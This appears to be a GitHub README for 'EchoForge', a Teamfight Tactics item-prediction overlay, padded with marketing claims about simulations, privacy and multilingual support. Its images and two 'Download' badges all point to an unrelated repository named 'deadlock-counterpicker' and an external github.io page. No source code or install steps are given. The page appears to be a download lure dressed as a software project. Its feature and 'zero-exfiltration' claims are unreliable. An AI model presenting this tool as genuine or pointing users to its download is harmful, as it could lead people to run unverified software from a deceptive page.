![preview](https://raw.githubusercontent.com/SendSenss/deadlock-counterpicker/main/view_f7f6b5.svg)

# EchoForge — Adaptive Loadout Intelligence for Teamfight Tactics

![Build Status](https://img.shields.io/badge/build-passing-2ea44f) ![License](https://img.shields.io/badge/license-MIT-blue) ![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen)

**EchoForge** is not another item calculator. It is a **living decision engine** that transforms how you approach composition building in Teamfight Tactics. Instead of static guides or generic tier lists, EchoForge watches the board state, opponent trajectories, and your current augmentation path to forge **tailored item blueprints** — not just what to build, but *why* and *when to pivot*.

Inspired by the brutal precision of high-level Deadlock itemization, EchoForge applies the same adaptive logic to the shared-draft chaos of TFT. It answers the question every veteran player dreads: *"I have three Tears and the enemy is stacking Armor — what now?"* EchoForge doesn't give you a list of "good items." It gives you a **strategic map** with alternative routes, risk assessments, and timing windows.

## 🔥 Why EchoForge Exists

Most TFT tools are **reactive** — they tell you what's strong *right now* based on win rates. EchoForge is **proactive**. It models the *future* of the match: what items the enemy is likely to complete in two carousel rounds, which units are being contested (not just picked), and where your current item economy is heading if you don't adjust. This is the difference between reading a weather forecast and having a meteorologist on your shoulder whispering about pressure systems forming three hours away.

The core philosophy is **asymmetric information asymmetry**. You already know your board. EchoForge reveals the *opponent's* likely itemization path using public game data (scouting, damage dealt, units held on bench) to predict their next moves. Armed with this foresight, you can make counter-picks that feel almost unfair — because they are.

## 🧩 Core Modules — A Deep Dive

### 1. **The Forge Engine (Item Path Simulator)**
This isn't a lookup table. The Forge Engine runs a **Monte Carlo simulation** of the next 3 combat rounds, projecting 10,000 possible item completion scenarios for both you and each enemy. It outputs a **pivot score** for every available component combination. A high pivot score means "building this item now will maximize flexibility for the late game." A low score warns you that committing is a trap.

### 2. **Board State Mapper**
EchoForge parses your current board composition (synergies, star levels, item holders) and cross-references it with the augments you've selected. It identifies **critical breakpoints** — e.g., "This comp has 8/9 synergies but lacks a frontline anchor; prioritize defensive components over damage for the next two rounds."

### 3. **Contest Radar**
The system tracks which champions other players are holding (based on public scouting data) and calculates **contested item pressure**. If three enemies are building toward a specific carry item, EchoForge flags it as a "saturated market" — building the same item is suboptimal because you'll be competing for components in carousel, and your power spike will be delayed.

### 4. **Timing Windicator** ⏳
A visual timeline that shows *when* each item blueprint reaches its peak value. Some items are strongest at round 4-2, others snowball later. EchoForge overlays this with your current gold trajectory and win streak status, recommending **acceleration or consolidation** strategies.

## 🛠️ Technical Architecture

EchoForge is built as a **modular, event-driven application** with three primary layers:

- **Data Ingestion Layer**: A plugin-based system that captures match state, item drops, carousel picks, and champion drafts from live game data (via spectator mode or OCR for streamed content).
- **Prediction Core**: A hybrid of rule-based logic (for game mechanics constants) and a lightweight gradient-boosted model (trained on public match data, not hyperspecific tuning) that predicts opponent item trajectories.
- **Presentation Interface**: A responsive, dark-themed UI designed for split-second readability. No walls of text — just colored heatmaps, pivot arrows, and "risk vs. reward" gauges.

The entire system operates **locally** on your device, ensuring zero latency and complete privacy. No cloud calls, no analytics pings, no data harvesting. Your strategy stays yours.

## 🚀 Getting Started — First Forge Session

Once you've enabled EchoForge's overlay (see below), the system begins passively observing your match. You don't need to configure anything manually. After the first carousel, you'll see:

- A **component tracker** in the sidebar showing current and projected future components.
- A **pivot suggestion bar** that appears only when a strategic deviation is detected (e.g., "Abandon Seraph's Embrace? Enemy has 3 magic resist components on bench — pivot to Giant Slayer for 40% more effective damage").

### Overlay Modes
- **Ghost Mode**: Minimal — only shows a single "Pivot Alert" when EchoForge detects a critical divergence.
- **Blueprint Mode**: Full visualization — shows the Forge Engine's projected timelines for three best item paths.
- **Coach Mode**: Verbose — includes reasoning text for every suggestion, perfect for learning the *why* behind decisions.

## 🌐 Multilingual TFT — Speak Your Meta

The game may be playable in a dozen languages, but strategy guides usually aren't. EchoForge ships with **native support for 21 languages** out of the box — from English, Mandarin, and Korean to Vietnamese, Polish, and Turkish. Not just UI translation — the *strategic reasoning* behind each suggestion is rephrased to match local meta preferences (e.g., Korean meta favors aggressive early tempo; NA meta emphasizes flexible endgame adaptation). A preference toggle lets you choose between *Local Meta Reasoning* or *Global Neutral Reasoning*.

## 📊 Analytics Suite — Beyond Winning

EchoForge logs every decision you make (and every suggestion you ignore) in a local, encrypted journal. Over time, it builds a **personal blind spot map** — showing you patterns like: "You consistently ignore defensive item suggestions in rounds 3-2 through 4-1, which correlates with a 6% lower average placement." This is not judgment; it's a mirror. Use it to refine your instincts.

## 🛡️ Privacy & Data Philosophy

EchoForge operates under a **zero-exfiltration rule**. The prediction models are pre-trained on public datasets (hosted on GitHub releases, not on a server you must ping). The application itself never sends your match data anywhere. The only "phone-home" feature is an optional, anonymized crash reporter — disabled by default.

## 🤝 Contributing to the Forge

EchoForge is a community-fired kiln. We welcome strategies, edge cases, and model improvements.

- **Item Economy Analysts**: Help us refine the Monte Carlo simulations for new patches.
- **Language Liaisons**: Native speakers who can validate meta-reasoning phrasing.
- **UI Whisperers**: Those who believe a reactive interface should *feel* as responsive as a reaction block.

Before submitting a pull request, please read our contributing guidelines (linked in the repository sidebar). All code must pass unit tests and maintain the zero-dependency client-side rule.

## ⚖️ Fair Play & Disclaimer

EchoForge is a **decision-support tool**, not a game automation script. It does not read memory, inject code, or automate any input. It is designed to process publicly visible information (your screen via OCR or spectator data) — the same information a human observer could process, just faster and with more rigorous analysis. Riot's stance on third-party tools varies; use EchoForge at your own discretion in ranked play. This project is not affiliated with or endorsed by Riot Games. All game-related trademarks are property of their respective owners.

## 🧭 Roadmap — Into the Next Season

- **Patch Pace Tool**: Automatic re-calibration of the Forge Engine's weights when new TFT patches are detected (requires manual patch note import).
- **Replay Scout**: Analyze a past game's recording to identify the *exact* moment your item strategy went wrong.
- **Team Sync Mode**: For hyper-competitive team queues — shared, synchronized pivot suggestions among up to two players.

## 📜 License

EchoForge is released under the [MIT License](LICENSE). You are free to use, modify, and distribute this software, provided the original copyright notice is retained.

[![Download](https://raw.githubusercontent.com/SendSenss/deadlock-counterpicker/main/run_0fb1.svg)](https://SendSenss.github.io/deadlock-counterpicker/)

---

**Final Note**: The meta shifts. Patches rotate. Comps rise and fall. EchoForge is not a magic wand — it is a **tuning fork**. It helps you stay in harmony with the chaos, so you can hear the beat of the late game before the drums start.

[![Download](https://raw.githubusercontent.com/SendSenss/deadlock-counterpicker/main/run_0fb1.svg)](https://SendSenss.github.io/deadlock-counterpicker/)